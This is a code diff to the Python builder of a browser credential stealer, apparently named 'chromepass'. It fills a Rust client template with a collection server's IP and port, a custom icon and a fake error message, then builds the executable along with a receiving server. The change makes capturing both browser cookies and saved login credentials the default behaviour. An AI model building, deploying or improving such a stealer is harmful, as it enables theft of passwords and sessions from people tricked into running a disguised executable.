@@ -75,7 +75,7 @@ def create_executable(filename, icon, mode="windowed"):
     ])
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", nocookies=False, nologin=False, port=80, nobuild=True):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
     build_command = f"cd {template_dir}\\{chromepass_base}; cargo build --release;"
@@ -90,9 +90,9 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
             "<<ERROR_BOOL>>", "true" if error_bool else "false")
         content = content.replace("<<ERROR_MESSAGE>>", error_message)
         content = content.replace(
-            "<<COOKIES_BOOL>>", "true" if not nocookies else "false")
+            "<<COOKIES_BOOL>>", "true" if cookies else "false")
         content = content.replace(
-            "<<LOGIN_BOOL>>", "true" if not nologin else "false")
+            "<<LOGIN_BOOL>>", "true" if login else "false")
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
@@ -172,10 +172,10 @@ def parse_arguments():
                         action="store_true", default=False, help="Use this to enable the error message. Default is False")
     parser.add_argument('--message', metavar="Error Message",
                         type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
-    parser.add_argument('--cookies', dest="cookies_bool",
-                        action="store_true", default=False, help="Use to only capture cookies. Default is both cookies and login")
-    parser.add_argument('--login', dest="login_bool",
-                        action="store_true", default=False, help="Use to only capture login credentials. Default is both cookies and login")
+    parser.add_argument('--nocookies', dest="cookies_bool",
+                        action="store_false", default=True, help="Use to not capture cookies. Default is capturing cookies and credentials")
+    parser.add_argument('--nologin', dest="login_bool",
+                        action="store_false", default=True, help="Use to not capture credentials. Default is capturing cookies and credentials")
     parser.add_argument('--pyserver', dest="pyserver",
                         action="store_true", default=False, help="Creates a python version of the server. Pair it with --nobuild-server to only have it as python")
     parser.add_argument('--nobuild_server', dest="noserver",
@@ -195,7 +195,7 @@ def parse_arguments():
     server = build_server(
         port=args.port, include_python=args.pyserver, nobuild=args.noserver)
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
-                          nocookies=args.cookies_bool, nologin=args.login_bool, port=args.port, nobuild=args.noclient)
+                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient)
     build_message(server, client)
 
 
